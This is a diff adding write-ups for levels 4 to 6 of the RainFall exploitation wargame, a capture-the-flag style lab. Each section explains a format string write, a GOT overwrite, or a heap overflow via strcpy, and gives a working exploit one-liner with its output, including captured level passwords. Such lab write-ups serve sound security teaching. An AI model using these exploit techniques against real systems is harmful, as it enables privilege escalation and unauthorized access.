@@ -145,16 +145,77 @@ b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
 # level4
+
 ## Type of exploit
+
+Same as level3, except `m` is not a function but a global variable:
+
+Format String Attack: no variadic argument to printf + no sanitization of user-defined conversion string fed to printf allows to print and edit values in memory.
+
+Lack of ASLR makes it easy to find address of a given symbol, namely `m`.
+
 ## Details of level4
 
+Same as level3, except the value to insert at the global variable symbol `m` is not `64`(10) but `16930116`(10).
+
+Steps:
+1. gets address of `m` (0x08049810)
+2. find position of conversion string in arguments to printfs (12th)
+3. use `%12$n` and build format string
+
+```shell-session
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' | ./level4
+```
+
 # level5
+
 ## Type of exploit
+
+Format String Attack + GOT overwrite
+
 ## Details of level5
 
+There is an uncalled function `o()` in the binary that calls a shell.
+
+`main()` calls `p()` which calls `fgets(stdin)` then `printf(user_input)` and then `exit@plt`.
+
+We can use a format string attack to overwrite the address pointed by the pointer the GOT provided with the address of `o()`.
+
+1. get address of `o()` (0x080484a4(16) == 134513828(10))
+2. get address of pointer provided by GOT
+3. get position of format string in the stack (4)
+4. use `%4$n` and build format string.
+
+```shell-session
+level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat) | ./level5
+[...Huge long string of bytes that prints for tens of seconds...]
+_
+whoami
+level6
+cat ~level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
 # level6
+
 ## Type of exploit
+
+Buffer Overflow + behaviour of Malloc and contiguity of allocated memory chunks + use of strcpy
+
 ## Details of level6
+
+`info functions` tells us there are three functions: `n()(0x08048454)`, `m()`, `main()`.
+
+In the main there are two successive calls to `malloc` into two different variables, and a mention of the address of `m()` as well, which address is placed in and called from a register.
+
+`disas n` tells us that there is a call to `system(/bin/cat /home/user/level7/.pass)` inside it, but `n()` is never called.
+
+Since we know the program uses `malloc` successively and calls `strcpy` with `argv[1]` and one of the `malloc-ed pointer`, we can use a `strcpy` vulnerability to overwrite the address of the allocated pointer that is stored in the register, and make it point to `n()`.
+
+```shell-session
+level6@RainFall:~$ ./level6 $(python -c 'print "B"*72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
 
 # level7
 ## Type of exploit
